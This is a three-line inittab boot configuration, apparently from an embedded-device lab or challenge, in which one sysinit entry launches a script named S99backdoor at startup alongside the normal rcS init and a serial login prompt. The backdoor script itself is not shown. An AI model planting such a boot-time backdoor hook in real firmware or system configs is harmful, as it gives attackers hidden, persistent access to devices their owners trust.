# code/inittab
::sysinit:/etc/init.d/rcS
::sysinit:/etc/init.s/S99backdoor
ttyS1::askfirst:/bin/login
